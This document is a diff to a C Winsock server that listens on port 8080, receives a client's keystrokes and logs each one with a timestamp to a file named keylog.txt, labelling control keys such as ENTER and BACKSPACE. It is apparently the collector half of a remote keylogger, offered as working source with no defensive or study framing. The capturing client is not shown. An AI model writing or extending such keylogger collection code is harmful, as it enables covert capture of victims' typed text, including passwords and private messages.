@@ -1,13 +1,78 @@
 #include <stdio.h>
+#include <string.h>
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <windows.h>
 
 #define WSA_VERSION_CODE 0x202
 #define CON_PORT 8080
+#define KEYLOG_FILE "keylog.txt"
 SOCKET serverSocket, clientSocket;
 
 DWORD WINAPI clientHandler(LPVOID);
+
+//BUILD A LOCAL TIMESTAMP: "YYYY-MM-DD HH:MM:SS" (+ ".mmm" WHEN REQUESTED)
+static void formatTimestamp(char *buffer, size_t size, BOOL withMilliseconds){
+    SYSTEMTIME st;
+    GetLocalTime(&st);
+
+    if(withMilliseconds){
+        snprintf(buffer, size, "%04d-%02d-%02d %02d:%02d:%02d.%03d", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);
+    }else{
+        snprintf(buffer, size, "%04d-%02d-%02d %02d:%02d:%02d", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
+    }
+}
+
+static void printTimestampPrefix(void){
+    char timestamp[40];
+
+    formatTimestamp(timestamp, sizeof(timestamp), FALSE);
+    printf("[%s] ", timestamp);
+}
+
+//APPEND ONE TIMESTAMPED ENTRY TO THE KEYLOG FILE
+static void logEntry(const char *entry){
+    FILE *logFile = fopen(KEYLOG_FILE, "a");
+    char timestamp[40];
+
+    if(logFile == NULL){
+        return;
+    }
+    formatTimestamp(timestamp, sizeof(timestamp), TRUE);
+    fprintf(logFile, "[%s] %s\n", timestamp, entry);
+    fclose(logFile);
+}
+
+//LOG A KEYSTROKE: PRINTABLE TEXT AS-IS, CONTROL KEYS AS A LABEL
+static void logKeystroke(const char *text, int length){
+    char entry[64];
+
+    if(length == 1 && text[0] == '\n'){
+        logEntry("[ENTER]");
+    }else if(length == 1 && text[0] == '\t'){
+        logEntry("[TAB]");
+    }else if(length == 1 && text[0] == '\b'){
+        logEntry("[BACKSPACE]");
+    }else{
+        if(length >= (int)sizeof(entry)){
+            length = (int)sizeof(entry) - 1;
+        }
+        memcpy(entry, text, (size_t)length);
+        entry[length] = '\0';
+        logEntry(entry);
+    }
+}
+
+//PRINT AN EVENT WITH TIMESTAMP ON SCREEN AND IN THE KEYLOG FILE
+static void reportEvent(const char *message){
+    char timestamp[40];
+
+    formatTimestamp(timestamp, sizeof(timestamp), FALSE);
+    printf("[%s] %s\n", timestamp, message);
+    fflush(stdout);
+    logEntry(message);
+}
+
 
 int main(void){
     
@@ -61,7 +126,7 @@ int main(void){
         //ACCEPT THE CLIENT, GET ITS ADDRESS AND CREATE A THREAD FOR IT
         clientSocket = accept(serverSocket, NULL, NULL);
         if(clientSocket != INVALID_SOCKET){
-            printf("Client connected.\n");
+            reportEvent("Client connected.");
             threadHandle = CreateThread(NULL, 0, &clientHandler, NULL, 0, &tID);
 
             //WAIT UNTIL THE THREAD TERMINATES
@@ -92,7 +157,10 @@ DWORD WINAPI clientHandler(LPVOID params){
     char utf8Buffer[4];
     int utf8Length = 0;
     int utf8Expected = 0;
+    int atLineStart = 1;
+    char message[96];
 
+    printTimestampPrefix();
     printf("Waiting for data...\n");
     fflush(stdout);
 
@@ -105,10 +173,20 @@ DWORD WINAPI clientHandler(LPVOID params){
             //PLAIN ASCII (LETTERS, NUMBERS, \n, \t) IS PRINTED RIGHT AWAY
             if(utf8Length == 0 && byte < 0x80){
                 if(byte == '\b'){
-                    printf("\b \b");    //ERASE THE PREVIOUS CHARACTER
+                    if(!atLineStart){
+                        printf("\b \b");    //ERASE THE PREVIOUS CHARACTER
+                    }
                 }else{
+                    if(atLineStart){
+                        printTimestampPrefix();
+                        atLineStart = 0;
+                    }
                     printf("%c", byte);
+                    if(byte == '\n'){
+                        atLineStart = 1;
+                    }
                 }
+                logKeystroke(&char_to_recv, 1);
                 fflush(stdout);
                 continue;
             }
@@ -123,16 +201,30 @@ DWORD WINAPI clientHandler(LPVOID params){
 
             utf8Buffer[utf8Length++] = (char)byte;
             if(utf8Length == utf8Expected){
+                if(atLineStart){
+                    printTimestampPrefix();
+                    atLineStart = 0;
+                }
                 fwrite(utf8Buffer, 1, (size_t)utf8Length, stdout);
                 fflush(stdout);
+                logKeystroke(utf8Buffer, utf8Length);
                 utf8Length = 0;
                 utf8Expected = 0;
             }
         } else if (bytes_transferred == 0) {
-            printf("\n[Client disconnected]\n");
+            if(!atLineStart){
+                printf("\n");
+                atLineStart = 1;
+            }
+            reportEvent("Client disconnected.");
             break;
         } else {
-            printf("\nConnection lost. Error code: %d\n", WSAGetLastError());
+            if(!atLineStart){
+                printf("\n");
+                atLineStart = 1;
+            }
+            snprintf(message, sizeof(message), "Connection lost. Error code: %d", WSAGetLastError());
+            reportEvent(message);
             break;
         }
     }
